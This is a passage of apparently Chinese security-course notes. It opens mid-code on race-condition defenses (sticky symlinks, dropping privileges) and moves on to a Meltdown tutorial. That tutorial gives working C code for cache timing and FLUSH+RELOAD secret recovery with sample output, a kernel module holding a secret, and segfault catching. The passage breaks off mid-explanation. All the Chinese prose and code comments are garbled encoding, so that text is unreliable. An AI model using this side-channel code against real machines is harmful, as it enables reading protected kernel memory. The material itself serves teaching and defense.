   }                                     ğŸ¢€ ç¬¬äº”ä¸ªçª—å£
   else fd3 = open("/tmp/XYZ", O_RDWR);

   fstat(fd1, &stat1);
   fstat(fd2, &stat2);
   fstat(fd3, &stat3);
 
   // æ¯”è¾ƒä¸‰ä¸ªæ‰“å¼€æ–‡ä»¶çš„ i-nodeï¼Œçœ‹å®ƒä»¬æ˜¯ä¸æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚
   if(stat1.st_ino == stat2.st_ino && stat2.st_ino == stat3.st_ino) {
      write_to_file(fd1);
   }Â 
   else { // ä¸æ˜¯åŒä¸€ä¸ªæ–‡ä»¶ã€‚
      fprintf(stderr, "Race condition detected\n");
      return -1;
   } 
   return 0;
}
```

### sticky symlink defense

linuxä¸­æ–‡ä»¶ç›®å½•æœ‰ä¸€ä¸ªç‰¹æ®Šæ¯”ç‰¹å«åšç²˜æ»ä½æ¯”ç‰¹ï¼Œå¯¹åˆ é™¤/é‡å‘½ååšäº†ç‰¹æ®Šçš„çº¦æŸï¼Œå®é™…ä¸Šå¤§éƒ¨åˆ†ç«æ€æ¡ä»¶ä¸/tmpä¸‹çš„ç¬¦å·è¿æ¥æœ‰å…³ã€‚

```
$ sudo sysctl -w fs.protected_symlinks=1
```

å¼€å¯ä¹‹åå…¨å±€å¯å†™çš„ç²˜æ€§ç›®å½•ä¸‹çš„ç¬¦å·é“¾æ¥åªèƒ½åœ¨ç¬¦å·é“¾æ¥çš„æ‰€æœ‰è€…å’Œè·Ÿéšè€…å’Œç›®å½•æ‰€æœ‰è€…çš„å…¶ä¸­ä¹‹ä¸€ç›¸åŒ¹é…æ—¶æ‰èƒ½è¢«è·Ÿéš

ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡è®¾ç¬¦å·é“¾æ¥çš„æ‰€æœ‰è€…ï¼ˆæ”»å‡»è€…å®é™…å…·æœ‰çš„æƒé™ï¼‰å’Œ [eUIDï¼ˆè·Ÿéšè€…ï¼‰ä»¥åŠç›®å½•æ‰€æœ‰è€…]å‡ä¸åŒçš„æ—¶å€™æˆ‘ä»¬å¯ä»¥è‡ªç„¶å±è”½æ”»å‡»

åœ¨æˆ‘ä»¬çš„æ”»å‡»åœºæ™¯ä¸­ï¼š
- **è·Ÿéšè€… (euid)**:Â rootÂ (å—å®³ç¨‹åº)
- **ç›®å½•æ‰€æœ‰è€…**Â (/tmp):Â root
- **ç¬¦å·é“¾æ¥æ‰€æœ‰è€…**:Â seedÂ (æ”»å‡»è€…)
    

ç”±äºç¬¦å·é“¾æ¥çš„æ‰€æœ‰è€…Â seedÂ ä¸è·Ÿéšè€…Â rootÂ å’Œç›®å½•æ‰€æœ‰è€…Â rootÂ å‡ä¸åŒ¹é…ï¼Œå½“Â fs.protected_symlinks=1Â æ—¶ï¼Œå†…æ ¸ä¼šé˜»æ­¢Â rootÂ æƒé™çš„ç¨‹åºè·Ÿéšè¿™ä¸ªç”±æ™®é€šç”¨æˆ·åˆ›å»ºçš„ç¬¦å·é“¾æ¥ï¼ŒfopenÂ è°ƒç”¨ä¼šå¤±è´¥ï¼Œæ”»å‡»è¢«é˜»æ­¢ã€‚

### æœ€å°æƒé™åŸåˆ™

æœ¬è´¨æ˜¯æˆ‘ä»¬ç»™äºˆäº†ç¨‹åºéœ€è¦åšçš„äº‹æƒ…è¿‡åˆ†å¤§çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰æœ€å°æƒé™æ‰§è¡Œ

`seteuid()`Â å’ŒÂ `setuid()`Â æ¥è®©ç¨‹åºæ°¸ä¹…æˆ–æš‚æ—¶æ”¾å¼ƒå…¶æƒé™

```c
 uid_t real_uid = getuid();  // å¾—åˆ°çœŸå®ç”¨æˆ·ID
 uid_t eff_uid  = geteuid(); // å¾—åˆ°æœ‰æ•ˆç”¨æˆ·ID

 seteuid (real_uid);     ğŸ¢€ ä¸´æ—¶å…³æ‰ root æƒé™ 

 f = open("/tmp/X", O_WRITE);
 if (f != -1)
     write_to_file(f);
 else
    fprintf(stderr, "Permission denied\n");

 seteuid (eff_uid); // å¦‚æœ‰éœ€è¦ï¼Œå†æ‰“å¼€ root æƒé™ 
```


**è®ºï¼šä¸ºä»€ä¹ˆæ­¤æ–¹æ³•å¯¹ç«æ€æ¡ä»¶æœ‰æ•ˆï¼Œè€Œå¯¹ç¼“å†²åŒºæº¢å‡ºæ— æ•ˆï¼Ÿ**

- **ç«æ€æ¡ä»¶æ”»å‡»**ï¼šæ”»å‡»è€…åªæ˜¯æ“çºµå¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿï¼Œå…¶è‡ªèº«çš„ä»£ç **ä¸ä¼šè¢«æ‰§è¡Œ**ã€‚å› æ­¤ï¼Œä¸€æ—¦å—å®³ç¨‹åºä¸´æ—¶æ”¾å¼ƒäº† root æƒé™ï¼Œopen()Â è°ƒç”¨å°±ä¼šå› ä¸ºæƒé™ä¸è¶³è€Œå¤±è´¥ï¼Œæ”»å‡»è€…æ— æ³•æ¢å¤æƒé™ã€‚
- **ç¼“å†²åŒºæº¢å‡ºæ”»å‡»**ï¼šæ”»å‡»è€…å°†è‡ªå·±çš„æ¶æ„ä»£ç ï¼ˆshellcodeï¼‰æ³¨å…¥åˆ°å—å®³ç¨‹åºçš„å†…å­˜ä¸­å¹¶ä½¿å…¶**è·å¾—æ‰§è¡Œ**ã€‚å³ä½¿åœ¨è°ƒç”¨æ˜“å—æ”»å‡»çš„å‡½æ•°å‰æš‚æ—¶æ”¾å¼ƒäº†æƒé™ï¼Œæ”»å‡»è€…çš„ä»£ç ä¸€æ—¦æ‰§è¡Œï¼Œå°±å¯ä»¥è‡ªå·±è°ƒç”¨Â seteuid(0)Â æ¥æ¢å¤ root æƒé™ï¼ˆå› ä¸ºä¿å­˜çš„ç”¨æˆ· ID ä»ç„¶æ˜¯ rootï¼‰ï¼Œç„¶åç»§ç»­æç ´åã€‚å› æ­¤ï¼Œä¸´æ—¶ç¦ç”¨æƒé™å¯¹ä»£ç æ³¨å…¥ç±»æ”»å‡»æ˜¯æ— æ•ˆçš„ã€‚

# Meltdown & Spectre æ¼æ´
2017 å¹´ï¼Œäººä»¬å‘ç°åŒ…æ‹¬è‹±ç‰¹å°”å’Œ ARM åœ¨å†…çš„è®¸å¤šç°ä»£å¤„ç†å™¨éƒ½å®¹æ˜“å—åˆ°åä¸ºç†”æ–­ï¼ˆMeltdownï¼‰çš„æ”»å‡»ã€‚è¯¥æ¼æ´å…è®¸ç”¨æˆ·çº§ç¨‹åºè¯»å–å†…æ ¸å†…å­˜ä¸­å­˜å‚¨çš„æ•°æ®ï¼Œä»è€Œå¯¼è‡´æ•°æ®æ³„éœ²ã€‚è¯¥æ¼æ´æ˜¯ CPU è®¾è®¡ä¸Šçš„ç¼ºé™·ã€‚
ç†”æ–­å’Œå¹½çµæ”»å‡»éƒ½åˆ©ç”¨ CPU ç¼“å­˜ä½œä¸ºä¾§ä¿¡é“çªƒå–å—ä¿æŠ¤æ•°æ®ï¼Œå…¶ä¸­é‡‡ç”¨çš„æŠ€æœ¯ç§°ä¸º FLUSH+RELOADã€‚

æˆ‘ä»¬å…ˆä»Meltdownå¼€å§‹

## Meltdown åŸç†ç†è§£

ä»æ¯”æ–¹å‡ºå‘

> å‡è®¾ä½ èº«å¤„ä¸€ä¸ªæ²¡æœ‰çª—æˆ·çš„æˆ¿é—´ï¼Œæˆ¿å¤–æœ‰ä¸‰ç›ç¯ï¼Œç”±æˆ¿å†…çš„ä¸‰ä¸ªå¼€å…³æ§åˆ¶ã€‚ä½ åªèƒ½ç¦»å¼€æˆ¿é—´ä¸€æ¬¡ï¼Œå¦‚ä½•ç¡®å®šå“ªä¸ªå¼€å…³å¯¹åº”å“ªç›ç¯ï¼Ÿ

å¸¸è§„æ€è·¯ï¼ˆâ€œå¼€â€ä¸â€œå…³â€ä¸¤ç§çŠ¶æ€ï¼‰æ— æ³•è§£å†³é—®é¢˜ã€‚è§£æ³•çš„å…³é”®åœ¨äºåˆ©ç”¨ç¯æ³¡çš„ç‰©ç†ç‰¹æ€§ï¼Œåˆ›é€ å‡ºç¬¬ä¸‰ç§çŠ¶æ€ã€‚ä½ å¯ä»¥ï¼š

1. æ‰“å¼€å¼€å…³Aï¼Œç­‰å¾…å‡ åˆ†é’Ÿã€‚
2. å…³é—­å¼€å…³Aï¼Œç„¶åæ‰“å¼€å¼€å…³Bã€‚
3. ç«‹å³ç¦»å¼€æˆ¿é—´ã€‚

æ­¤æ—¶ï¼Œä¸‰ç›ç¯åˆ†åˆ«å¤„äºä¸‰ç§å¯åŒºåˆ†çš„çŠ¶æ€ï¼š
- **äº®ç€çš„ç¯**ï¼šå¯¹åº”å¼€å…³Bã€‚
- **ç†„ç­ä½†æ¸©çƒ­çš„ç¯**ï¼šå¯¹åº”å¼€å…³Aã€‚
- **ç†„ç­ä¸”å†°å†·çš„ç¯**ï¼šå¯¹åº”å¼€å…³Cã€‚

â€œæ¸©åº¦â€å°±æ˜¯ä¸€ä¸ª**ä¾§ä¿¡é“ (Side Channel)**ï¼Œå®ƒæ³„éœ²äº†å¼€å…³Aä¹‹å‰çš„æ“ä½œå†å²ï¼Œå³ä½¿å…¶å½“å‰çŠ¶æ€ï¼ˆâ€œå…³â€ï¼‰ä¸å¼€å…³Cç›¸åŒã€‚

å‡çº§ä¸€ä¸‹

>ä¸€ä¸ªå­˜æ”¾ç€é‡è¦å¯†ç çš„æˆ¿é—´ï¼ˆå†…æ ¸ç©ºé—´ï¼‰åªå…è®¸æœ€é«˜æƒé™è€…è¿›å…¥ã€‚ä¸€ä¸ªä¸¥æ ¼çš„å®ˆå«ï¼ˆCPUè®¿é—®æ§åˆ¶é€»è¾‘ï¼‰è´Ÿè´£æ£€æŸ¥æƒé™ã€‚æœ‰è¶£çš„æ˜¯ï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œå®ˆå«ä¼šè®©ä½ **å…ˆè¿›å…¥æˆ¿é—´**ï¼Œåœ¨ä½ è§‚å¯Ÿå¯†ç çš„åŒæ—¶ï¼Œä»–æ‰å¼€å§‹æ£€æŸ¥ä½ çš„è¯ä»¶ã€‚
>
>å¦‚æœæ£€æŸ¥é€šè¿‡ï¼Œä½ å°±å¯ä»¥ä»å®¹è®°ä¸‹å¯†ç ç¦»å¼€ã€‚
>å¦‚æœæ£€æŸ¥å¤±è´¥ï¼Œä½ ä¼šè¢«ç«‹åˆ»èµ¶å‡ºæˆ¿é—´ï¼Œå®ˆå«è¿˜ä¼šç”¨â€œè®°å¿†æ¶ˆé™¤å™¨â€è®©ä½ å¿˜æ‰çœ‹åˆ°çš„ä¸€åˆ‡ï¼ˆå›æ»šæ“ä½œç»“æœï¼‰ï¼Œå¹¶æŠŠæˆ¿é—´å†…çš„ä¸€åˆ‡æ¢å¤åŸçŠ¶ã€‚

ä½ æ— æ³•é€šè¿‡å¸¸è§„æ¸ é“å¸¦å‡ºä¿¡æ¯ã€‚ä½†æˆ¿é—´é‡Œæœ‰256ä¸ªå¼€å…³ï¼Œåˆ†åˆ«æ§åˆ¶å®¤å¤–çš„256ç›ç¯ã€‚ä½ åœ¨è¢«èµ¶èµ°å‰ï¼Œæ ¹æ®ä½ çœ‹åˆ°çš„å¯†ç çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æ•°å€¼ï¼ˆä¾‹å¦‚æ˜¯83ï¼‰ï¼Œè¿…é€Ÿæ‰“å¼€ç¬¬83å·å¼€å…³ã€‚è™½ç„¶ä½ ç¦»å¼€åè®°å¿†è¢«æ¸…é™¤ï¼Œå¼€å…³ä¹Ÿè¢«å®ˆå«é‡ç½®äº†ï¼Œä½†ä½ å¤–é¢çš„åŒä¼™å¯ä»¥é€šè¿‡è§¦æ‘¸ç¯æ³¡ï¼Œå‘ç°ç¬¬83å·ç¯æ³¡æ˜¯æ¸©çƒ­çš„ã€‚

è¿™æ ·ï¼Œå°½ç®¡ç›´æ¥çš„è®°å¿†ï¼ˆå¯„å­˜å™¨çŠ¶æ€ï¼‰è¢«æ¸…é™¤äº†ï¼Œä½†æ“ä½œç•™ä¸‹çš„ç‰©ç†ç—•è¿¹ï¼ˆ**CPUç¼“å­˜**ï¼‰å´æ³„éœ²äº†ç§˜å¯†ã€‚

ä¸€è¨€ä»¥è”½ä¹‹ï¼ŒCPUçš„ç¼“å­˜/åˆ†æ”¯é¢„æµ‹ç­‰æœºåˆ¶è®©éæ³•è®¿é—®è€…èƒ½å¤Ÿåœ¨è¢«æŠ¹é™¤è®°å¿†çš„æƒ…å†µä¸‹è¿›è¡Œå¯¹æ•æ„Ÿä¿¡æ¯çš„â€œä¸´æ—¶è®¿é—®â€ï¼Œå°½ç®¡è¿™ä¸ªè®¿é—®æœ¬èº«ä¸èƒ½è¢«å­˜æ¡£ï¼Œä½†é€šè¿‡ç±»ä¼¼æ¸©åº¦çš„ä¾§ä¿¡é“æˆ‘ä»¬èƒ½å¤Ÿå¤åŸè¿™äº›è®°å¿†ï¼Œæ³„æ¼ç§˜å¯†ã€‚

- **æœºå¯†æˆ¿é—´**Â ->Â **å†…æ ¸ç©ºé—´**
- **å®ˆå«çš„æƒé™æ£€æŸ¥**Â ->Â **CPUçš„å†…å­˜ä¿æŠ¤æœºåˆ¶**
- **å…ˆè¿›å…¥æˆ¿é—´å†ç­‰å¾…ç»“æœ**Â ->Â **CPUçš„ä¹±åºæ‰§è¡Œ (Out-of-Order Execution)**
- **è®°å¿†è¢«æ¶ˆé™¤**Â ->Â **æŒ‡ä»¤è¢«æ’¤é”€ï¼Œè®¡ç®—ç»“æœè¢«ä¸¢å¼ƒ**
- **ç¯æ³¡çš„ä½™æ¸©**Â ->Â **CPUç¼“å­˜ç•™ä¸‹çš„ç—•è¿¹**


## åŸºäºCPUç¼“å­˜çš„ä¾§ä¿¡é“

ç°ä»£CPUä¸ºäº†å¼¥è¡¥ä¸»å­˜(RAM)ä¸CPUä¹‹é—´çš„é€Ÿåº¦é¸¿æ²Ÿï¼Œè®¾è®¡äº†é«˜é€Ÿç¼“å­˜(CPU Cache)ã€‚è®¿é—®ç¼“å­˜ä¸­çš„æ•°æ®è¿œå¿«äºè®¿é—®ä¸»å­˜ã€‚è¿™ä¸ª**è®¿é—®æ—¶å·®**å°±æ˜¯ç†”æ–­æ”»å‡»çš„â€œç¯æ³¡æ¸©åº¦â€ï¼Œæ˜¯æ„å»ºä¾§ä¿¡é“çš„åŸºç¡€ã€‚

æˆ‘ä»¬å°†ä½¿ç”¨ä¸€ç§åä¸ºÂ FLUSH+RELOADÂ çš„ç»å…¸ç¼“å­˜ä¾§ä¿¡é“æŠ€æœ¯ã€‚

é¦–å…ˆæˆ‘ä»¬å¯ä»¥å†™cè½»æ¾æ„ŸçŸ¥hit å’Œ missçš„æ—¶é—´å·®å¼‚

```c
/* CacheTime.c - æ¼”ç¤ºç¼“å­˜å‘½ä¸­ä¸æœªå‘½ä¸­çš„æ—¶é—´å·®å¼‚ */
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>

uint8_t array[10*4096];

int main(int argc, const char **argv) {
    int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;

    // 1. åˆå§‹åŒ–æ•°ç»„
    for(i=0; i<10; i++) array[i*4096]=1;

    // 2. å°†æ•°ç»„æ‰€æœ‰å…ƒç´ ä»ç¼“å­˜ä¸­æ¸…ç©º (FLUSH)
    for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);

    // 3. è®¿é—®å…¶ä¸­ä¸¤ä¸ªå…ƒç´ ï¼Œä½¿å…¶è¢«åŠ è½½è¿›ç¼“å­˜
    array[3*4096] = 100;
    array[7*4096] = 200;

    // 4. ä¾æ¬¡æµ‹é‡è®¿é—®æ¯ä¸ªå…ƒç´ çš„è€—æ—¶
    for(i=0; i<10; i++) {
        addr = &array[i*4096];
        time1 = __rdtscp(&junk);         // è¯»å–æ—¶é—´æˆ³è®¡æ•°å™¨
        junk = *addr;
        time2 = __rdtscp(&junk) - time1; // è®¡ç®—æ—¶é—´å·®
        printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
    }
    return 0;
}
```

-   `array[10*4096]`ï¼šæˆ‘ä»¬è®©æ•°ç»„å…ƒç´ çš„é—´éš”ä¸º4096å­—èŠ‚ï¼ˆä¸€ä¸ªå†…å­˜é¡µçš„å¤§å°ï¼‰ï¼Œä»¥ç¡®ä¿å®ƒä»¬æ˜ å°„åˆ°ä¸åŒçš„ç¼“å­˜è¡Œï¼Œé¿å…å¹²æ‰°ã€‚
- `_mm_clflush(&address)`ï¼šè¿™æ˜¯ä¸€ä¸ªx86æŒ‡ä»¤ï¼Œç”¨äºå°†æŒ‡å®šåœ°å€æ‰€åœ¨ç¼“å­˜è¡Œä»æ‰€æœ‰çº§åˆ«çš„CPUç¼“å­˜ä¸­é©±é€å‡ºå»ã€‚
- `__rdtscp()`ï¼šè¯»å–CPUçš„æ—¶é—´æˆ³è®¡æ•°å™¨ï¼ˆTSCï¼‰ï¼Œå¯ä»¥ç²¾ç¡®åœ°æµ‹é‡CPUå‘¨æœŸæ•°ã€‚

```bash
$ gcc -march=native CacheTime.c
$ ./a.out
Access time for array[0*4096]: 50 CPU cycles
Access time for array[1*4096]: 172 CPU cycles
Access time for array[2*4096]: 160 CPU cycles
Access time for array[3*4096]: 22 CPU cycles
Access time for array[4*4096]: 160 CPU cycles
Access time for array[5*4096]: 160 CPU cycles
Access time for array[6*4096]: 152 CPU cycles
Access time for array[7*4096]: 24 CPU cycles
Access time for array[8*4096]: 160 CPU cycles
Access time for array[9*4096]: 160 CPU cycles
```

ç°åœ¨ï¼Œæˆ‘ä»¬åˆ©ç”¨FLUSH+RELOADæŠ€æœ¯æ¥ä¼ é€’ä¸€ä¸ªå­—èŠ‚çš„ç§˜å¯†å€¼Â secretã€‚  
è¯¥æŠ€æœ¯åŒ…å«ä¸‰ä¸ªå…³é”®æ­¥éª¤ï¼š

1. **FLUSH (æ¸…ç©º)**: å‡†å¤‡ä¸€ä¸ªå¤§å°ä¸ºÂ 256 * 4096Â çš„æ¢æµ‹æ•°ç»„Â probe_arrayã€‚åœ¨è·å–ç§˜å¯†å‰ï¼Œä½¿ç”¨Â `_mm_clflush`Â å°†æ•´ä¸ªæ¢æµ‹æ•°ç»„ä»ç¼“å­˜ä¸­æ¸…ç©ºã€‚
2. **ACCESS (è®¿é—®)**: è¯»å–ç§˜å¯†å€¼Â secretÂ (0-255)ï¼Œå¹¶ç”¨å®ƒä½œä¸ºç´¢å¼•å»è®¿é—®æ¢æµ‹æ•°ç»„ä¸­çš„ä¸€ä¸ªç‰¹å®šå…ƒç´ ï¼šprobe_array[secret * 4096]ã€‚è¿™ä¸ªæ“ä½œä¼šä½¿è¿™ä¸€ä¸ªã€ä¸”ä»…æœ‰è¿™ä¸€ä¸ªå…ƒç´ è¢«åŠ è½½åˆ°CPUç¼“å­˜ä¸­ã€‚
3. **RELOAD (é‡è½½)**: éå†æ•´ä¸ªæ¢æµ‹æ•°ç»„ï¼Œæµ‹é‡è®¿é—®æ¯ä¸€ä¸ªå…ƒç´ çš„è€—æ—¶ã€‚è€—æ—¶æœ€çŸ­çš„é‚£ä¸ªå…ƒç´ ï¼Œå…¶ç´¢å¼•å€¼å°±æ˜¯æˆ‘ä»¬æƒ³è¦è·å–çš„ç§˜å¯†å€¼Â secretã€‚


```c
/* FlushReload.c - ä½¿ç”¨FLUSH+RELOADçªƒå–ä¸€ä¸ªå­—èŠ‚çš„ç§˜å¯† */
#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>

#define CACHE_HIT_THRESHOLD (80) // ç¼“å­˜å‘½ä¸­çš„æ—¶é—´é˜ˆå€¼
#define DELTA 1024

uint8_t array[256*4096];
unsigned char secret = 94;
int temp;

// 1. FLUSH: æ¸…ç©ºæ¢æµ‹æ•°ç»„
void flushSideChannel() {
    int i;
    // åˆå§‹åŒ–æ•°ç»„ä»¥ç¡®ä¿ç‰©ç†å†…å­˜è¢«åˆ†é…
    for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
    // å°†æ•°ç»„ä»ç¼“å­˜ä¸­åˆ·æ–°
    for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

// 2. ACCESS: ç”¨ç§˜å¯†å€¼è®¿é—®æ¢æµ‹æ•°ç»„
void getSecret() {
    temp = array[secret*4096 + DELTA];
}

// 3. RELOAD: æ£€æµ‹å“ªä¸ªå…ƒç´ è¢«ç¼“å­˜
void reloadSideChannel() {
    int i;
    int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for(i = 0; i < 256; i++){
        addr = &array[i*4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD){
            printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
            printf("The Secret = %d.\n",i);
        }
    }
}

int main(int argc, const char **argv) {
    flushSideChannel();
    getSecret();
    reloadSideChannel();
    return (0);
}```

**ç¼–è¯‘ä¸æ‰§è¡Œ**
```bash
$ gcc -march=native FlushReload.c
$ ./a.out
array[94*4096 + 1024] is in cache.
The Secret = 94.
```

å‰é¢çš„ä¾‹å­åªæ˜¯çªƒå–äº†ç¨‹åºè‡ªèº«çš„å˜é‡ï¼Œå¹¶æ— å®é™…å±å®³ã€‚çœŸæ­£çš„ç›®æ ‡æ˜¯**å†…æ ¸ç©ºé—´ (Kernel Space)**Â è¿™ä¸ªå­˜æ”¾ç€æ“ä½œç³»ç»Ÿæ‰€æœ‰ç§˜å¯†çš„â€œæˆ¿é—´â€ã€‚

åœ¨ä¸»æµæ“ä½œç³»ç»Ÿä¸­ï¼Œå†…å­˜è¢«åˆ†ä¸ºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ã€‚å¤„ç†å™¨é€šè¿‡ç‰¹æƒçº§ï¼ˆå¦‚x86çš„Ring 0-3ï¼‰æ¥éš”ç¦»ä¸¤è€…ã€‚ç”¨æˆ·ç¨‹åºï¼ˆRing 3ï¼‰æ— æ³•ç›´æ¥è®¿é—®å†…æ ¸å†…å­˜ï¼ˆRing 0ï¼‰ï¼Œä»»ä½•æ­¤ç±»å°è¯•éƒ½ä¼šè§¦å‘ä¸€ä¸ªç¡¬ä»¶å¼‚å¸¸ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒï¼ˆSegmentation Faultï¼‰ã€‚

```c
/* MeltdownKernel.c - ä¸€ä¸ªç”¨äºç†”æ–­æ”»å‡»å®éªŒçš„å†…æ ¸æ¨¡å— */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/vmalloc.h>
#include <asm/uaccess.h>

static char secret[8] = {'S', 'E', 'E', 'D', 'L', 'a', 'b', 's'};
static struct proc_dir_entry *secret_entry;
static char* secret_buffer;

// procæ–‡ä»¶è¢«è¯»å–æ—¶è°ƒç”¨æ­¤å‡½æ•°
static ssize_t read_proc(struct file *filp, char *buffer, size_t length, loff_t *offset) {
    // å…³é”®ï¼šè®¿é—®äº†å†…æ ¸ä¸­çš„'secret'å˜é‡ï¼Œè¿™å°†å¯¼è‡´å®ƒè¢«åŠ è½½åˆ°CPUç¼“å­˜ã€‚
    memcpy(secret_buffer, &secret, 8);
    // æ³¨æ„ï¼šæˆ‘ä»¬æ²¡æœ‰å‘ç”¨æˆ·ç©ºé—´è¿”å›ä»»ä½•æ•°æ®ï¼Œé¿å…äº†ç›´æ¥æ³„éœ²ã€‚
    return 0;
}

static const struct file_operations test_proc_fops = {
    .owner = THIS_MODULE,
    .read  = read_proc,
};

static int __init test_proc_init(void) {
    // åˆ›å»ºä¸€ä¸ª8å­—èŠ‚çš„å†…æ ¸ç¼“å†²åŒº
    secret_buffer = (char*)vmalloc(8);
    // åœ¨/procä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºsecret_dataçš„æ–‡ä»¶
    secret_entry = proc_create_data("secret_data", 0444, NULL, &test_proc_fops, NULL);
    // å°†'secret'çš„å†…æ ¸åœ°å€æ‰“å°åˆ°å†…æ ¸æ—¥å¿—ä¸­ï¼Œä¾›æ”»å‡»è€…æŸ¥çœ‹
    printk("secret data address:%p\n", &secret);
    return 0;
}

static void __exit test_proc_cleanup(void) {
    remove_proc_entry("secret_data", NULL);
    vfree(secret_buffer);
}

module_init(test_proc_init);
module_exit(test_proc_cleanup);
MODULE_LICENSE("GPL");
```


ç¼–è¯‘å¹¶åŠ è½½è¯¥æ¨¡å—ï¼ˆinsmod MeltdownKernel.koï¼‰åï¼Œé€šè¿‡Â dmesg | grep 'secret data address'Â å¯ä»¥è·å¾—ç§˜å¯†æ•°æ®åœ¨å†…æ ¸ä¸­çš„åœ°å€ã€‚è¯»å–Â /proc/secret_dataÂ æ–‡ä»¶åˆ™ä¼šå°†æ­¤ç§˜å¯†åŠ è½½åˆ°ç¼“å­˜ä¸­ã€‚

ç›´æ¥åœ¨ç”¨æˆ·ç¨‹åºä¸­è§£å¼•ç”¨å†…æ ¸åœ°å€ä¼šè§¦å‘ç¡¬ä»¶ä¿æŠ¤æœºåˆ¶ï¼Œå¯¼è‡´æ®µé”™è¯¯ï¼ˆSegmentation Faultï¼‰ï¼Œè¿›ç¨‹å´©æºƒã€‚

```c
#include <stdio.h>
int main() {
    // å‡è®¾ä» dmesg å¾—åˆ°åœ°å€ 0xfb61b000
    char *kernel_data_addr = (char*)0xfb61b000; 
    char kernel_data = *kernel_data_addr; // è®¿é—®è¿è§„ï¼Œè§¦å‘å¼‚å¸¸
    printf("I have reached here.\n"); // æ­¤è¡Œæ°¸è¿œä¸ä¼šæ‰§è¡Œ
    return 0;
}
```

è¿™è¯æ˜äº†â€œå®ˆå«â€ï¼ˆå†…å­˜ä¿æŠ¤ï¼‰æ˜¯æœ‰æ•ˆçš„ã€‚

ä¸ºäº†åœ¨è§¦å‘æ®µé”™è¯¯åç¨‹åºèƒ½ç»§ç»­æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦æ•è·Â SIGSEGVÂ ä¿¡å·ã€‚Cè¯­è¨€ä¸­å¯ä»¥é€šè¿‡Â sigsetjmpÂ å’ŒÂ siglongjmpÂ æ¥å®ç°ç±»ä¼¼Â try-catchÂ çš„æœºåˆ¶ã€‚

**ExceptionHandling.cÂ - æ•è·æ®µé”™è¯¯**


```c
#include <stdio.h>
#include <signal.h>
#include <setjmp.h>

static sigjmp_buf jbuf;

static void catch_segv() {
    // å½“SIGSEGVå‘ç”Ÿæ—¶ï¼Œè·³è½¬å› sigsetjmp è®¾ç½®çš„æ£€æŸ¥ç‚¹
    siglongjmp(jbuf, 1);
}

int main() {
    unsigned long kernel_data_addr = 0xfb61b000;
    
    // æ³¨å†Œä¿¡å·å¤„ç†å‡½æ•°
    signal(SIGSEGV, catch_segv);

    // è®¾ç½®ä¸€ä¸ªæ£€æŸ¥ç‚¹ï¼Œé¦–æ¬¡è°ƒç”¨è¿”å›0
    if (sigsetjmp(jbuf, 1) == 0) {
        // è¿™è¡Œä»£ç å°†è§¦å‘SIGSEGV
        char kernel_data = *(char*)kernel_data_addr; 
        printf("Kernel data ... is: %c\n", kernel_data); // ä¸ä¼šæ‰§è¡Œ
    } else {
        // ä» siglongjmp è·³è½¬å›æ¥åï¼Œsigsetjmp è¿”å›é0å€¼ï¼Œæ‰§è¡Œæ­¤åˆ†æ”¯
        printf("Memory access violation!\n");
    }

    printf("Program continues to execute.\n");
    return 0;
}
```

ç¨‹åºè¾“å‡º "Memory access violation!" å’Œ "Program continues to execute."ï¼Œè¡¨æ˜æˆ‘ä»¬æˆåŠŸæ•è·äº†å¼‚å¸¸ï¼Œç¨‹åºæ²¡æœ‰å´©æºƒã€‚è¿™æ˜¯æ”»å‡»èƒ½å¾ªç¯è¿›è¡Œçš„å‰æã€‚

**Meltdownæ¼æ´çš„æ ¸å¿ƒ**ï¼šç°ä»£é«˜æ€§èƒ½CPUä¸ºäº†æå‡æ•ˆç‡ï¼Œä¼šé‡‡ç”¨**ä¹±åºæ‰§è¡Œï¼ˆOut-of-Order Executionï¼‰**ã€‚å½“é‡åˆ°ä¸€æ¡è€—æ—¶è¾ƒé•¿çš„æŒ‡ä»¤ï¼ˆå¦‚ä»ä¸»å­˜åŠ è½½æ•°æ®ï¼‰æ—¶ï¼ŒCPUä¸ä¼šåŸåœ°ç­‰å¾…ï¼Œè€Œæ˜¯ä¼šç»§ç»­å‘åâ€œæ¨æµ‹æ€§åœ°â€æ‰§è¡Œåç»­ä¸ç›¸å…³çš„æŒ‡ä»¤ã€‚

è€ƒè™‘ä»¥ä¸‹ä¼ªä»£ç ï¼š

```c
// 1. è§¦å‘è®¿é—®è¿è§„ï¼Œè€—æ—¶é•¿ï¼ˆå› ä¸ºè¦æ£€æŸ¥æƒé™ï¼‰
kernel_data = *kernel_address; 

// 2. ä¾èµ–äºä¸Šé¢ç»“æœçš„æŒ‡ä»¤
array[kernel_data * 4096] += 1;
```

åœ¨å¾®æ¶æ„å±‚é¢ï¼ŒCPUçš„æ‰§è¡Œæ­¥éª¤æ˜¯ï¼š

1. CPUå¼€å§‹æ‰§è¡Œç¬¬ä¸€è¡Œï¼Œè¯·æ±‚åŠ è½½Â kernel_addressÂ çš„æ•°æ®ã€‚è¿™æ˜¯ä¸€ä¸ªå†…æ ¸åœ°å€ï¼Œéœ€è¦è¿›è¡Œæƒé™æ£€æŸ¥ã€‚
